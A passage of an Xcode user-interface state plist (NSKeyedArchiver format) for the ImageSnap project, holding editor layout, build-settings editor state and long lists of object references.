			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>21</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>213</integer>
				</dict>
			</array>
		</dict>
		<real>260</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>17</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>215</integer>
				</dict>
			</array>
		</dict>
		<real>1129</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>217</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>218</integer>
				</dict>
			</array>
		</dict>
		<string>IDEUtilitiesArea</string>
		<real>260</real>
		<string>ImageSnap.m</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>221</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>222</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>223</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>224</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>225</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>226</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>227</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>228</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>229</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>230</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>231</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>232</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>46</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>582</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>587</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>590</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>621</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>622</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>633</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
			</array>
		</dict>
		<string>BreakpointsActivated</string>
		<string>DefaultEditorStatesForURLs</string>
		<string>DebuggingWindowBehavior</string>
		<string>ActiveRunDestination</string>
		<string>ActiveScheme</string>
		<string>LastCompletedPersistentSchemeBasedActivityReport</string>
		<string>DocumentWindows</string>
		<string>DefaultEditorFrameSizeForURLs</string>
		<string>RecentEditorDocumentURLs</string>
		<string>AppFocusInMiniDebugging</string>
		<string>MiniDebuggingConsole</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>233</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>234</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>235</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>236</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>237</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>545</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>561</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>571</integer>
				</dict>
			</array>
		</dict>
		<string>Xcode.Xcode3ProjectSupport.EditorDocument.Xcode3Project</string>
		<string>Xcode.IDEKit.EditorDocument.SourceCode</string>
		<string>IDEQuickLookEditor.Editor</string>
		<string>Xcode.IDEKit.EditorDocument.LogDocument</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>238</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>240</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>239</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.xcodeproj/</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>241</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>242</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>243</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>244</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>245</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>246</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>252</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>544</integer>
				</dict>
			</array>
		</dict>
		<string>Xcode3ProjectEditorPreviousProjectEditorClass</string>
		<string>Xcode3ProjectEditor.sourceList.splitview</string>
		<string>Xcode3ProjectEditorSelectedDocumentLocations</string>
		<string>Xcode3ProjectEditor_Xcode3BuildSettingsEditor</string>
		<string>Xcode3BuildSettingsEditor</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>112</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>247</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>248</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>250</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>142</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>249</integer>
				</dict>
			</array>
		</dict>
		<real>170</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>115</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>116</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>142</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>251</integer>
				</dict>
			</array>
		</dict>
		<real>959</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>253</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>543</integer>
			</dict>
			<key>documentURL</key>
			<dict>
				<key>CF$UID</key>
				<integer>254</integer>
			</dict>
			<key>selection</key>
			<dict>
				<key>CF$UID</key>
				<integer>256</integer>
			</dict>
			<key>timestamp</key>
			<dict>
				<key>CF$UID</key>
				<integer>255</integer>
			</dict>
		</dict>
		<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.xcodeproj/</string>
		<real>335465234.22007102</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>257</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>258</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>259</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>260</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>261</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>262</integer>
				</dict>
			</array>
		</dict>
		<string>Project</string>
		<string>Editor</string>
		<string>Xcode3BuildSettingsEditorLocations</string>
		<string>ImageSnap</string>
		<string>Xcode3BuildSettingsEditor</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>263</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>264</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>265</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>266</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>267</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>268</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>269</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>270</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>541</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>46</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>46</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>46</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>104</integer>
				</dict>
			</array>
		</dict>
		<string>Collapsed Build Property Categories</string>
		<string>Selected Build Properties</string>
		<string>Xcode3BuildSettingsEditorDisplayMode</string>
		<string>Xcode3BuildPropertyValueDisplayMode</string>
		<string>Xcode3BuildSettingsEditorMode</string>
		<string>Xcode3BuildPropertyNameDisplayMode</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>271</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>272</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>273</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>274</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>275</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>276</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>277</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>278</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>279</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>280</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>281</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>282</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>283</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>284</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>285</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>286</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>287</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>288</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>289</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>290</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>291</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>292</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>293</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>294</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>295</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>296</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>297</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>298</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>299</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>300</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>301</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>302</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>303</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>304</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>305</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>306</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>307</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>308</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>309</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>310</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>311</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>312</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>313</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>314</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>315</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>316</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>317</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>318</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>319</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>320</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>321</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>322</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>323</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>324</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>325</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>326</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>327</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>328</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>329</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>330</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>331</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>332</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>333</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>334</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>335</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>336</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>337</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>338</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>339</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>340</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>341</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>342</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>343</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>344</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>345</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>346</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>347</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>348</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>349</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>350</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>351</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>352</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>353</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>354</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>355</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>356</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>357</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>358</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>359</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>360</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>361</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>362</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>363</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>364</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>365</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>366</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>367</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>368</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>369</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>370</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>371</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>372</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>373</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>374</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>375</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>376</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>377</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>378</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>379</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>380</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>381</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>382</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>383</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>384</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>385</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>386</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>387</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>388</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>389</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>390</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>391</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>392</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>393</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>394</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>395</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>396</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>397</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>398</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>399</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>400</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>401</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>402</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>403</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>404</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>405</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>406</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>407</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>408</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>409</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>410</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>411</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>412</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>413</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>414</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>415</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>416</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>417</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>418</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>419</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>420</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>421</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>422</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>423</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>424</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>425</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>426</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>427</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>428</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>429</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>430</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>431</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>432</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>433</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>434</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>435</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>436</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>437</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>438</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>439</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>440</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>441</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>442</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>443</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>444</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>445</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>446</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>447</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>448</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>449</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>450</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>451</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>452</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>453</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>454</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>455</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>456</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>457</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>458</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>459</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>460</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>461</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>462</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>463</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>464</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>465</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>466</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>467</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>468</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>469</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>470</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>471</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>472</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>473</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>474</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>475</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>476</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>477</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>478</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>479</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>480</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>481</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>482</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>483</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>484</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>485</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>486</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>487</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>488</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>489</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>490</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>491</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>492</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>493</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>494</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>495</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>496</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>497</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>498</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>499</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>500</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>501</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>502</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>503</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>504</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>505</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>506</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>507</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>508</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>509</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>510</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>511</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>512</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>513</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>514</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>515</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>516</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>517</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>518</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>519</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>520</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>521</integer>
				</dict>
